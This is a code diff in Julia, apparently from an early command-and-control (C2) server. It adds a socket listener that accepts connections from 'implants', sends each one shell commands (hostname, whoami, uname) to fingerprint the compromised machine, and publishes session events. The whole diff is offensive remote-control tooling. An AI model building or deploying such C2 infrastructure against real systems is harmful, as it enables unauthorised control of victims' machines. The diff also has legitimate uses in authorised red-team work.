@@ -1,34 +1,67 @@
 using UUIDs
 using Sockets
 
-function handleNewImplant(conn)
-    id = uuid4()
+
+function sendCommand(conn, cmd::String)
+    @debug " 📥 sending '$cmd'"
+    write(conn, "$cmd\n")
+    response = readline(conn)
+    @debug "Got '$response'"
+    return response
+end
+
+function handleNewImplant(conn, bus :: MessageBus, listenerId::String)
+    id = string(uuid4())
     println("New implant connected $id")
 
+    sockName = getsockname(conn)
+    println("Socket name: $sockName")
+
+    hostname = sendCommand(conn, "hostname")
+    user = sendCommand(conn, "whoami")
+    os = inferOS(sendCommand(conn, "uname"))
+
+    publish!(bus, SessionStarted(id=id, listenerId=listenerId, hostname=hostname, user=user, os=os))
     while !eof(conn)
+        # TODO get commands from channel
         msg = readline(conn)
-        println(" >>> Request [$id]: $msg")
-        write(conn, "ack $msg")
     end
 
     println("done with implant $id")
 end
 
-function onStartListener(ev::StartListener)
-    @info "start listener on port $(ev.port)"
+function inferOS(os::String) :: AbstractString
+    os = lowercase(os)
+    if contains(os, "darwin")
+        return "macOS"
+    elseif contains(os, "linux")
+        return "Linux"
+    elseif contains(os, "win")
+        return "Windows"
+    end
+    return "Unknown"
+end
+
+function onStartListener(ev::StartListener, bus:: MessageBus)
+    listenerId = string(uuid4())
+    @info "Start C2 listener ($listenerId) on port $(ev.port)"
 
     # HTTP.serve!(handleNewImplant, "0.0.0.0",ev.port; async=true)
-    errormonitor(@async begin
+    listenerTask = errormonitor(@async begin
         server = Sockets.listen(ev.port)
         while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
             sock = Sockets.accept(server)
-            @async handleNewImplant(sock)
+            errormonitor(@async handleNewImplant(sock, bus, listenerId))
         end
+        @warn "Listener stopped"
     end)
-    @warn "post listener"
+    return ListenerReady(listenerId, ev.port, listenerTask)
 end
 
 function startC2(bus:: MessageBus)
-    println("starting C2")
-    register!(bus, StartListener, onStartListener)
+    # start out with one listener out of the box
+    ev = onStartListener(StartListener(), bus)
+    publish!(bus, ev)
+
+    register!(bus, StartListener, (ev) -> onStartListener(ev, bus))
 end 
